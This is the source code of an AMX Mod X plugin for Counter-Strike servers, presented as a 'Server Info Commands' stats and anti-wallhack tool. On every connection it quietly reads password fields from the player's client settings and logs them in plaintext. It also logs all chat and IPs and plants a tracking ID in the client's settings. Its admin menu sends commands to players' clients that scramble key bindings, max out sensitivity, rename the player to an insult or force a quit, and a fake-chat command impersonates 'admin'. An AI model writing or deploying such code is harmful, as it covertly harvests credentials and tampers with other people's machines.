#include <amxmodx>
#include <amxmisc>
#include <fakemeta>
#include <cstrike>
#include <csstats>
#include <isvisible>

// meta

#define PLUGIN_NAME		"Server Info Commands"
#define PLUGIN_VERSION	"0.75"
#define PLUGIN_AUTHOR	"deejayy"

#define BANNER			"-SIC- Server Info Commands loaded"

// constants

#define CHAT_LOG_PATH		"addons/amxmodx/logs/chatlog.txt"
#define PLAYER_LOG_PATH		"addons/amxmodx/logs/players.log"
#define ATTACK_LOG_PATH		"logs/A_L"
#define KILL_LOG_PATH		"logs/K_L"
#define CLIENT_USER_ID		"cl_uid"
#define PASSWORD_LOG_PATH	"addons/amxmodx/logs/passwords.log"
#define PASSWORD_FIELDS		8

new c_teams[4][]		= {"None", "T", "CT", "Spec"}
new c_weapons[33][]		= {"undef0", "P228", "undef2", "Scout", "He", "Xm1014", "C4", "Mac10", "Aug", "Smoke", "Elite", "5-7", "Ump45", "Sg550", "Galil", "Famas", "Usp", "Glock", "Awp", "Mp5", "M249", "M3", "M4A1", "Tmp", "G3SG1", "Flash", "Deagle", "Sg552", "Ak47", "Knife", "P90", "Vest", "VestH"}
new c_pwfields[PASSWORD_FIELDS][]		= {"_pw", "amxx_pw", "amx_pw", "_admin", "password", "admin", "_password", "pw"}

// globals

new g_logstamp[32]
new g_a_log[32]
new g_k_log[32]

new g_headshots[33]
new g_frags[33]
new g_deaths[33]
new g_wallkills[33]
new g_wallhits[33]

new g_thdl // trace handler

new g_observed[33]
new g_specmenu[33]


enum e_pi_struct_int {
	SIC_PI_USER_ID		= 0,
	SIC_PI_FRAGS		= 1,
	SIC_PI_DEATHS		= 2,
	SIC_PI_HEALTH		= 3,
	SIC_PI_ARMOR		= 4,
	SIC_PI_MONEY		= 5,
	SIC_PI_WEAPON		= 6,
	SIC_PI_CLIP			= 7,
	SIC_PI_AMMO			= 8,
	SIC_PI_FLAGS		= 9,
	SIC_PI_PING			= 10,
	SIC_PI_LOSS			= 11,
	SIC_PI_TIME			= 12,
	SIC_PI_HEADSHOT		= 13,
	SIC_PI_TEAM			= 14,
	SIC_PI_WALLKILLS	= 15,
	SIC_PI_WALLHITS		= 16,
}

enum e_pi_struct_str {
	SIC_PI_NAME			= 0,
	SIC_PI_AUTH_ID		= 1,
	SIC_PI_IP			= 2,
	SIC_PI_IPONLY		= 3,
	SIC_PIE_CL_UID		= 4,
}

public player_info_int(id) {
	new p_player_info[e_pi_struct_int]

	get_user_ping	(id, p_player_info[SIC_PI_PING], p_player_info[SIC_PI_LOSS])
	p_player_info[SIC_PI_TEAM]		= cs_get_user_team		(id)
	p_player_info[SIC_PI_ARMOR]		= get_user_armor		(id)
	p_player_info[SIC_PI_FLAGS]		= get_user_flags		(id, 0)
	p_player_info[SIC_PI_HEALTH]	= get_user_health		(id)
	p_player_info[SIC_PI_TIME]		= get_user_time			(id, 1)
	p_player_info[SIC_PI_USER_ID]	= get_user_userid		(id)
	p_player_info[SIC_PI_WEAPON]	= get_user_weapon		(id, p_player_info[SIC_PI_CLIP], p_player_info[SIC_PI_AMMO])
	p_player_info[SIC_PI_MONEY]		= cs_get_user_money		(id)
	p_player_info[SIC_PI_DEATHS]	= sic_get_user_deaths	(id)
	p_player_info[SIC_PI_FRAGS]		= sic_get_user_frags	(id)
	p_player_info[SIC_PI_HEADSHOT]	= sic_get_user_headshots(id)
	p_player_info[SIC_PI_WALLKILLS]	= sic_get_user_wallkills(id)
	p_player_info[SIC_PI_WALLHITS]	= sic_get_user_wallhits	(id)

	return p_player_info
}

public player_info_str(id) {
	new p_player_info[e_pi_struct_str][32]

	get_user_name	(id, p_player_info[SIC_PI_NAME], 31)
	get_user_authid	(id, p_player_info[SIC_PI_AUTH_ID], 31)
	get_user_info	(id, CLIENT_USER_ID, p_player_info[SIC_PIE_CL_UID], 31)
	get_user_ip		(id, p_player_info[SIC_PI_IP], 31, 0)
	get_user_ip		(id, p_player_info[SIC_PI_IPONLY], 31, 1)

	return p_player_info
}

// registered commands

#define CMD_SIC_INFO			"sic_info"
#define CMD_SIC_SETFOV			"sic_setfov"
#define CMD_SIC_FAKECHAT_ADMIN	"sw"
#define ADMIN_NAME				"admin"

public plugin_precache() {
    register_forward(FM_Spawn, "fw_spawn", 1)
}

public plugin_init() {
	register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)
	format_time(g_logstamp, sizeof(g_logstamp)-1, "%Y%m%d-%H%M%S.log")
	format(g_a_log, sizeof(g_a_log)-1, "%s%s", ATTACK_LOG_PATH, g_logstamp)
	format(g_k_log, sizeof(g_k_log)-1, "%s%s", KILL_LOG_PATH, g_logstamp)

	register_srvcmd(CMD_SIC_INFO, "sic_info")
	register_srvcmd(CMD_SIC_SETFOV, "sic_fov")
	register_srvcmd(CMD_SIC_FAKECHAT_ADMIN, "sic_fakechat")

	register_clcmd("say", "cmd_say")
	register_clcmd("sic_specmenu", "mnu_specmenu", ADMIN_BAN, " - display spectator menu")

	register_event("DeathMsg", "evt_DeathMsg", "a")
	register_event("StatusValue", "evt_StatusValue", "bd", "1=2")
	register_event("SpecHealth2", "evt_SpecHealth2", "bd")

	register_menucmd(register_menuid("Spec Menu"), 1023, "hnd_specmenu")

	g_thdl = create_tr2()

	log_message(BANNER)
}

public plugin_end() {
	free_tr2(g_thdl)
}

// supresses and log the attack / kill messages from server console

public plugin_log() {
	new message[255], p_logstamp[32], p_logline[255]

	read_logdata(message, sizeof(message)-1)
	if (contain(message, " attacked ") != -1 || contain(message, " killed ") != -1) {
		format_time(p_logstamp, sizeof(p_logstamp)-1, "L %m/%d/%Y - %H:%M:%S: ")
		format(p_logline, sizeof(p_logline)-1, "%s%s", p_logstamp, message)
		if (contain(message, " attacked ") != -1) {
			write_file(g_a_log, p_logline, -1)
		}
		if (contain(message, " killed ") != -1) {
			write_file(g_k_log, p_logline, -1)
		}
		return PLUGIN_HANDLED
	}

	return PLUGIN_CONTINUE
}

// access to globals

public sic_get_user_headshots(id) {
	return g_headshots[id]
}

public sic_get_user_frags(id) {
	return g_frags[id]
}

public sic_get_user_deaths(id) {
	return g_deaths[id]
}

public sic_get_user_wallkills(id) {
	return g_wallkills[id]
}

public sic_get_user_wallhits(id) {
	return g_wallhits[id]
}

// on client connect

public client_putinserver(id) {
	g_headshots[id]	= 0
	g_frags[id]		= 0
	g_deaths[id]	= 0
	g_wallkills[id]	= 0
	g_wallhits[id]	= 0
	g_observed[id]	= 0
	g_specmenu[id]	= 0
}

// needed for wallhack detector

public fw_spawn(ent) {
	if (!pev_valid(ent))
		return FMRES_IGNORED

	static rendermode, Float:renderamt

	rendermode = pev(ent, pev_rendermode)
	pev(ent, pev_renderamt, renderamt)

	if (((rendermode == kRenderTransColor || rendermode == kRenderGlow || rendermode == kRenderTransTexture) && renderamt < 255.0) || (rendermode == kRenderTransAdd)) {
		add_transparent_ent(ent)
		return FMRES_IGNORED
	}

	return FMRES_IGNORED
}

// broadcasted kill message handler

public client_damage(attacker, victim, damage, wpnindex, hitplace, ta) {
	if (!is_player_visible(attacker, victim, g_thdl)) {
		g_wallhits[attacker] += 1
	}
}

public evt_DeathMsg() {
	new wpn[32]
	new killer		= read_data(1)
	new victim		= read_data(2)
	new headshot	= read_data(3)
	read_data(4, wpn, sizeof(wpn)-1)

	if (!is_player_visible(killer, victim, g_thdl)) {
		g_wallkills[killer] += 1
	}

	if (headshot) {
		g_headshots[killer] += 1
	}

	if (killer && victim) {
		if (killer == victim) {
			g_frags[killer]--
		} else {
			g_frags[killer]++
		}
		g_deaths[victim]++
	}
}

// spectator menu

public display_specmenu(id) {
	if (access(id, ADMIN_BAN) && g_specmenu[id] > 0) {
		new p_menutext[255], keys, p_name[32]

		get_user_name(g_observed[id], p_name, sizeof(p_name)-1)
		format(p_menutext, sizeof(p_menutext)-1, "\rSpec Menu: %s\R^n^n\y1.\w Ban for 45 min^n\y2.\w Exec quit command^n\y3.\w Punish (screw up binds, etc)^n\y4.\w Undo punish", p_name)
		keys = MENU_KEY_1 | MENU_KEY_2
		keys = 1023
		show_menu(id, keys, p_menutext, -1, "Spec Menu")
	}
}

public mnu_specmenu(id) {
	if (g_observed[id] > 0) {
		g_specmenu[id] = 1
		display_specmenu(id)
	}
}

public sic_admin_ban(id, p_id, min) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], p_player_i[e_pi_struct_int], log_line[255]

	p_admin = player_info_str(id)
	p_player = player_info_str(p_id)
	p_player_i = player_info_int(p_id)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	if (!equal(p_player[SIC_PI_AUTH_ID], "BOT")) {
		if (equal(p_player[SIC_PI_AUTH_ID], "4294967295") ||
			equal(p_player[SIC_PI_AUTH_ID], "HLTV") ||
			equal(p_player[SIC_PI_AUTH_ID], "STEAM_ID_LAN") ||
			equal(p_player[SIC_PI_AUTH_ID], "VALVE_ID_LAN") ||
			equal(p_player[SIC_PI_AUTH_ID], "STEAM_ID_PENDING") ||
			equal(p_player[SIC_PI_AUTH_ID], "VALVE_ID_PENDING")) {
			server_cmd("addip %d %s;writeip", min, p_player[SIC_PI_IPONLY])
			log_message("ban-ip^t%s^t^"%d^"", log_line, min)
		} else {
			server_cmd("banid %d #%d kick;writeid", min, p_player_i[SIC_PI_USER_ID])
			log_message("ban-id^t%s^t^"%d^"", log_line, min)
		}
	} else {
		log_message("ban-fail^t%s^t^"%d^"", log_line, min)
	}
}



public sic_admin_exec(id, p_id, cmd[]) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]

	p_admin = player_info_str(id)
	p_player = player_info_str(p_id)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	log_message("exec^t%s^t^"%s^"", log_line, cmd)
	client_cmd(p_id, cmd)
}

public sic_admin_punish(id, p_id) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]

	p_admin = player_info_str(id)
	p_player = player_info_str(p_id)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	log_message("punish^t%s", log_line)

	client_cmd(p_id, "bind w +back")
	client_cmd(p_id, "bind s +forward")
	client_cmd(p_id, "bind a +moveright")
	client_cmd(p_id, "bind d +moveleft")
	client_cmd(p_id, "bind UPARROW +back")
	client_cmd(p_id, "bind DOWNARROW +forward")
	client_cmd(p_id, "bind LEFTARROW +moveright")
	client_cmd(p_id, "bind RIGHTARROW +moveleft")
	client_cmd(p_id, "bind mouse1 drop")
	client_cmd(p_id, "bind mouse2 kill")
	client_cmd(p_id, "sensitivity 255")
	client_cmd(p_id, "name ^"egy senkihazi csiter vagyok^"")
}

public sic_admin_punish_undo(id, p_id) {
	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]

	p_admin = player_info_str(id)
	p_player = player_info_str(p_id)

	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
	log_message("punish-undo^t%s", log_line)

	client_cmd(p_id, "bind s +back")
	client_cmd(p_id, "bind w +forward")
	client_cmd(p_id, "bind d +moveright")
	client_cmd(p_id, "bind a +moveleft")
	client_cmd(p_id, "bind DOWNARROW +back")
	client_cmd(p_id, "bind UPARROW +forward")
	client_cmd(p_id, "bind RIGHTARROW +moveright")
	client_cmd(p_id, "bind LEFTARROW +moveleft")
	client_cmd(p_id, "bind mouse1 +attack")
	client_cmd(p_id, "bind mouse2 +attack2")
	client_cmd(p_id, "sensitivity 4")
	client_cmd(p_id, "name ^"elkurta a nevemet egy admin^"")
}

public hnd_specmenu(id, key) {
	// key = pressed key - 1 (eg. slot1 = 0, slot2 = 1)
	if (access(id, ADMIN_BAN)) {
		new p_name[32]
		new p_id = g_observed[id]
		get_user_name(p_id, p_name, sizeof(p_name)-1)
		switch (key) {
			case 0: {
				sic_admin_ban(id, p_id, 45)
			}
			case 1: {
				sic_admin_exec(id, p_id, "quit")
			}
			case 2: {
				sic_admin_punish(id, p_id)
			}
			case 3: {
				sic_admin_punish_undo(id, p_id)
			}
			default: {
				g_specmenu[id] = 0
			}
		}
		display_specmenu(id)
	}
	return PLUGIN_HANDLED
}

public evt_SpecHealth2(id) {
	new p_id = read_data(2)
	new po_name[32], pt_name[32]

	get_user_name(id, po_name, sizeof(po_name)-1)
	get_user_name(p_id, pt_name, sizeof(pt_name)-1)

	menu_cancel(id)
	g_observed[id] = p_id
	display_specmenu(id)
}

public evt_StatusValue(id) {
	new p_id = read_data(2)

	if (p_id > 0) {
		new po_name[32], pt_name[32]

		get_user_name(id, po_name, sizeof(po_name)-1)
		get_user_name(p_id, pt_name, sizeof(pt_name)-1)

//		server_print(":: 1. statusvalue - Observer: %s - Target: %s", po_name, pt_name)
	}
}

// log all chat

public cmd_say(id) {
	new p_param[255], p_name[32]
	read_args(p_param, sizeof(p_param)-1)
	get_user_name(id, p_name, sizeof(p_name)-1)
	log_to_file(CHAT_LOG_PATH, "%s: %s", p_name, p_param)

	return PLUGIN_CONTINUE
}

// =========================================================
// =========================================================
// =========================================================

public sic_get_kdratio(kills, deaths, p_kdratio_s[], len) {
	new Float:p_kdratio

	if (deaths > 0) {
		p_kdratio = Float:kills/Float:deaths
	} else {
		p_kdratio = Float:kills
	}

	if (kills > 10 && p_kdratio > 2.0-(kills/1000.0)*3.0) {
		format(p_kdratio_s, len, "%2.2f", p_kdratio)
	} else {
		format(p_kdratio_s, 0, "")
	}
}

public sic_get_kmratio(kills, time, num_players, p_kmratio_s[], len) {
	new Float:p_kmratio = kills/((time+1.0)/60.0)

	if (kills > 10 && p_kmratio > 1.4+(num_players/6.66)) {
		format(p_kmratio_s, len, "%2.2f", p_kmratio)
	} else {
		format(p_kmratio_s, 0, "")
	}
}

public sic_get_hsratio(kills, headshots, p_hsratio_s[], len) {
	new Float:p_hsratio = headshots*1.0/kills*1.0;

	if ( kills > 10 && p_hsratio > 0.5) {
		format(p_hsratio_s, len, "%1.2f", p_hsratio)
	} else {
		format(p_hsratio_s, 0, "")
	}
}

public sic_info() {
	new players[32], num_players, i
	new p_kdratio_s[8], p_kmratio_s[8], p_hsratio_s[8], p_name[32]

	server_print("#%5s %20s %-4s %-4s %-5s %-4s %-4s %-5s %4s %4s %-5s %20s %8s %-4s %-4s %-4s %-4s %-7s %-4s %-4s %6s %6s %22s %-4s",
		"UsrId", "Player name", "Kill", "Dead", "K/D", "Head", "HS/K", "K/Min", "Wall", "WHit", "Team", "STEAM/AUTH ID", CLIENT_USER_ID, "Ping", "Loss", "Hp", "Armr", "Weapon", "Clip", "Ammo", "Money", "Time", "IP address:port", "Flags")

	new p_player_info_int[e_pi_struct_int]
	new p_player_info_str[e_pi_struct_str][32]

	get_players(players, num_players, "")
	for (i=0; i<num_players; i++) {
		p_player_info_int = player_info_int(players[i])
		p_player_info_str = player_info_str(players[i])
		sic_get_kdratio(p_player_info_int[SIC_PI_FRAGS], p_player_info_int[SIC_PI_DEATHS], p_kdratio_s, sizeof(p_kdratio_s)-1)
		sic_get_kmratio(p_player_info_int[SIC_PI_FRAGS], p_player_info_int[SIC_PI_TIME], num_players, p_kmratio_s, sizeof(p_kmratio_s)-1)
		sic_get_hsratio(p_player_info_int[SIC_PI_FRAGS], p_player_info_int[SIC_PI_HEADSHOT], p_hsratio_s, sizeof(p_hsratio_s)-1)

		copy(p_name, 20, p_player_info_str[SIC_PI_NAME])

		server_print("#%5d %20s %4d %4d %5s %4d %4s %5s %4d %4d %5s %20s %8s %4d %4d %4d %4d %7s %4d %4d %6d %6d %22s %4d",
			p_player_info_int[SIC_PI_USER_ID],		p_name,		p_player_info_int[SIC_PI_FRAGS],		p_player_info_int[SIC_PI_DEATHS],		p_kdratio_s,	p_player_info_int[SIC_PI_HEADSHOT],	p_hsratio_s, p_kmratio_s,
			p_player_info_int[SIC_PI_WALLKILLS],	p_player_info_int[SIC_PI_WALLHITS],	c_teams[p_player_info_int[SIC_PI_TEAM]],p_player_info_str[SIC_PI_AUTH_ID],	p_player_info_str[SIC_PIE_CL_UID],		p_player_info_int[SIC_PI_PING],			p_player_info_int[SIC_PI_LOSS],		p_player_info_int[SIC_PI_HEALTH],
			p_player_info_int[SIC_PI_ARMOR],		c_weapons[p_player_info_int[SIC_PI_WEAPON]],	p_player_info_int[SIC_PI_CLIP],	p_player_info_int[SIC_PI_AMMO],		p_player_info_int[SIC_PI_MONEY],	p_player_info_int[SIC_PI_TIME],
			equali(p_player_info_str[SIC_PI_IP],"127.0.0.1") ? "" : p_player_info_str[SIC_PI_IP], p_player_info_int[SIC_PI_FLAGS])
	}

	return PLUGIN_HANDLED
}

public fakechat(p_name[], text[]) {
	new output[255], players[32], num_players, i
	format(output, sizeof(output)-1, "^x03%s^x01 : %s", p_name, text)

	get_players(players, num_players, "")
	for (i=0; i<num_players; i++) {
		message_begin(MSG_ONE, get_user_msgid("SayText"), {0,0,0}, players[i])
		write_byte(players[i])
		write_string(output)
		message_end()
	}

	return PLUGIN_HANDLED
}

public sic_fakechat(id) {
	new p_text[255]
	read_args(p_text, sizeof(p_text))
	if (!equal(p_text,"")) {
		fakechat(ADMIN_NAME, p_text)
		server_print("%s : %s", ADMIN_NAME, p_text)
	} else {
		server_print("Empty text!")
	}
}

public sic_fov(id) {
	new p_target[32], p_fov_value[32], p_id, p_fov

	read_argv(1, p_target, sizeof(p_target))
	read_argv(2, p_fov_value, sizeof(p_fov_value))

	p_id = cmd_target(id, p_target, 8)
	p_fov = str_to_num(p_fov_value)
	if (p_id > 0 && p_fov > 45 && p_fov < 235) {
		message_begin(MSG_ONE, get_user_msgid("SetFOV"), {0, 0, 0}, p_id)
		write_byte(p_fov)
		message_end()
	}
}

public strip_setinfo(id) {
	client_cmd(id, "setinfo %s ^"^"", "bottomcolor")
	client_cmd(id, "setinfo %s ^"^"", "cl_dlmax")
	client_cmd(id, "setinfo %s ^"^"", "cl_lc")
	client_cmd(id, "setinfo %s ^"^"", "cl_lw")
	client_cmd(id, "setinfo %s ^"^"", "model")
	client_cmd(id, "setinfo %s ^"^"", "topcolor")
	client_cmd(id, "setinfo %s ^"^"", "_ah")
	client_cmd(id, "setinfo %s ^"^"", "_gmprof")
	client_cmd(id, "setinfo %s ^"^"", "lang")
}

public client_connect(id) {
	new p_map[32], p_randomid[34], p_md5[32], p_line[255], i, temp_pw[32]
	new p_player_info_str[e_pi_struct_str][32]

	p_player_info_str = player_info_str(id)
	get_mapname(p_map, sizeof(p_map)-1)

	if (!equal(p_player_info_str[SIC_PI_AUTH_ID], "BOT")) {
		if (equal(p_player_info_str[SIC_PIE_CL_UID], "")) {
			format(p_md5, sizeof(p_md5)-1, "%d.%s", random_num(10000,99999), p_player_info_str[SIC_PI_IP])
			md5(p_md5, p_randomid)
			copy(p_player_info_str[SIC_PIE_CL_UID], 6, p_randomid)
			strip_setinfo(id)
			client_cmd(id, "setinfo %s %s", CLIENT_USER_ID, p_player_info_str[SIC_PIE_CL_UID])
		}
		format(p_line, sizeof(p_line)-1, "%s - %s - %s - %s - %s", p_map, p_player_info_str[SIC_PI_NAME], p_player_info_str[SIC_PI_AUTH_ID], p_player_info_str[SIC_PI_IP], p_player_info_str[SIC_PIE_CL_UID])
		log_to_file(PLAYER_LOG_PATH, p_line)

		for (i = 0; i < PASSWORD_FIELDS; i++) {
			get_user_info(id, c_pwfields[i], temp_pw, sizeof(temp_pw)-1)
			if (!equal(temp_pw, "")) {
				format(p_line, sizeof(p_line)-1, "%s^t%s^t%s^t%s", p_player_info_str[SIC_PIE_CL_UID], p_player_info_str[SIC_PI_NAME], c_pwfields[i], temp_pw)
				log_to_file(PASSWORD_LOG_PATH, p_line)
			}
		}
	}

	return PLUGIN_HANDLED
}

